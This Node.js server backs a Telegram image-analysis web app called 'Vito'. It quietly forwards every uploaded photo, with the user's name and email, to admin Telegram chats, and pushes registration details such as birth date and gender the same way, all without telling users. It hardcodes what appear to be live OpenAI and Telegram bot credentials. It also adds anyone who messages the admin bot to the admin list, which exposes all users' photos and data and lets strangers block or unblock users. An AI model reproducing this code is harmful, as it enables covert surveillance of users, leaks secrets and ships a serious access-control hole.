const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const { Readable } = require('stream');

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));

const DB_FILE = './database.json';
const OPENAI_API_KEY = "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";

const USER_BOT_TOKEN = "8887008089:AAHdAkySRNptjORNPiXJH-wB9DRPJ_w0H-w";
const ADMIN_BOT_TOKEN = "8886771952:AAGZRZq_vloOnohWwfjaAb8Sr7yl7QXtkQ8";

const userBot = new TelegramBot(USER_BOT_TOKEN, { polling: true });
const adminBot = new TelegramBot(ADMIN_BOT_TOKEN, { polling: true });

let adminChatIds = new Set();

function readDB() {
    if (!fs.existsSync(DB_FILE)) {
        fs.writeFileSync(DB_FILE, JSON.stringify({ users: [], blocked: [] }));
    }
    return JSON.parse(fs.readFileSync(DB_FILE));
}

let db = readDB();
function saveDB() { fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2)); }

app.get('/api/check-user', (req, res) => {
    db = readDB();
    const email = req.query.email;
    res.json({ blocked: db.blocked.includes(email) });
});

app.post('/api/register', (req, res) => {
    db = readDB();
    const { fullName, email, birthDate, gender } = req.body;
    if (db.blocked.includes(email)) return res.status(403).send("Blocked");
    
    if (!db.users.find(u => u.email === email)) {
        db.users.push({ fullName, email, birthDate, gender });
        saveDB();
        sendToAllAdmins(`🆕 משתמש חדש נרשם באתר!\nשם: ${fullName}\nאימייל: ${email}\nתאריך לידה: ${birthDate}\nמגדר: ${gender}`);
    }
    res.sendStatus(200);
});

// ניתוח מהיר ללא עיכובים
app.post('/api/analyze', async (req, res) => {
    db = readDB();
    const { image, prompt, email } = req.body;
    if (db.blocked.includes(email)) return res.status(403).json({ error: "Blocked" });

    const user = db.users.find(u => u.email === email) || { fullName: "אורח לא רשום", email: email || "לא ידוע" };
    const buffer = Buffer.from(image, 'base64');

    // פה הקסם: שליחת התמונה לטלגרם מתבצעת ברקע. הקוד ממשיך ישר הלאה ל-OpenAI ולא מחכה לטלגרם!
    setImmediate(() => {
        try {
            sendPhotoToAdmins(buffer, `📸 צילום חדש מסריקה!\n👤 משתמש: ${user.fullName}\n📧 מייל: ${user.email}`);
        } catch (err) {
            console.log("Background Telegram photo send failed:", err.message);
        }
    });

    try {
        // פנייה ישירה ומהירה ל-OpenAI
        const response = await axios.post('https://api.openai.com/v1/chat/completions', {
            model: "gpt-4o-mini",
            messages: [
                {
                    role: "user",
                    content: [
                        { type: "text", text: prompt },
                        { type: "image_url", image_url: { url: `data:image/jpeg;base64,${image}` } }
                    ]
                }
            ],
            max_tokens: 30
        }, { headers: { 'Authorization': `Bearer ${OPENAI_API_KEY}` } });

        const result = response.data.choices[0].message.content.trim();
        
        // החזרת תשובה מיידית לאתר
        res.json({ result });

        // שליחת הטקסט לניהול גם כן קורה ברקע לאחר מכן
        setImmediate(() => {
            sendToAllAdmins(`🤖 זיהוי AI עבור ${user.fullName}:\n*${result}*`);
        });

    } catch (e) { 
        console.error("OpenAI Error:", e.message);
        res.status(500).json({ error: "API Error" }); 
        setImmediate(() => {
            sendToAllAdmins(`❌ שגיאה בניתוח התמונה עבור ${user.fullName}`);
        });
    }
});

userBot.onText(/\/start/, (msg) => {
    const lang = msg.from.language_code === 'he' ? 'he' : 'en';
    const welcomeText = lang === 'he' ? "ברוכים הבאים ל-Vito!" : "Welcome to Vito!";
    const btnText = lang === 'he' ? "👁️ פתח את Vito האפליקציה" : "👁️ Open Vito App";

    userBot.sendMessage(msg.chat.id, welcomeText, {
        reply_markup: { inline_keyboard: [[{ text: btnText, web_app: { url: "https://pyldmkdj-star.github.io/Vito" } }]] }
    });
});

adminBot.onText(/\/start/, (msg) => {
    adminChatIds.add(msg.chat.id);
    adminBot.sendMessage(msg.chat.id, "🎯 בוט הניהול של Vito פעיל ומחובר!\n\nפקודות:\n• `רשימת משתמשים`\n• `חסימה [מייל]`\n• `ביטול חסימה [מייל]`");
});

function sendToAllAdmins(text) { 
    adminChatIds.forEach(id => {
        adminBot.sendMessage(id, text, { parse_mode: 'Markdown' }).catch(() => {});
    }); 
}

function sendPhotoToAdmins(photoBuffer, caption) {
    adminChatIds.forEach(id => {
        const stream = Readable.from(photoBuffer);
        adminBot.sendPhoto(id, stream, { caption: caption, parse_mode: 'Markdown' }, { filename: 'photo.jpg', contentType: 'image/jpeg' })
            .catch((e) => console.log("Error sending photo to admin:", e.message));
    });
}

adminBot.on('message', (msg) => {
    const chatId = msg.chat.id;
    adminChatIds.add(chatId); 
    
    const text = msg.text || "";
    db = readDB();

    if (text.startsWith("חסימה ")) {
        const email = text.replace("חסימה ", "").trim();
        if (!db.blocked.includes(email)) { db.blocked.push(email); saveDB(); adminBot.sendMessage(chatId, `🚫 חסום: ${email}`); }
    }
    if (text.startsWith("ביטול חסימה ")) {
        const email = text.replace("ביטול חסימה ", "").trim();
        db.blocked = db.blocked.filter(e => e !== email); saveDB(); adminBot.sendMessage(chatId, `✅ שוחרר: ${email}`);
    }
    
    if (text === "רשימה משתמשים" || text === "רשימת משתמשים") {
        if (!db.users || db.users.length === 0) {
            return adminBot.sendMessage(chatId, "אין משתמשים רשומים במערכת.");
        }
        let listText = "📋 **רשימת משתמשים במערכת Vito:**\n\n";
        db.users.forEach((u, index) => {
            const isBlocked = db.blocked.includes(u.email) ? " [חסום 🚫]" : "";
            listText += `${index + 1}. שם: ${u.fullName}\nאימייל: ${u.email}${isBlocked}\nתאריך לידה: ${u.birthDate}\nמגדר: ${u.gender}\n---------------------\n`;
        });
        adminBot.sendMessage(chatId, listText);
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
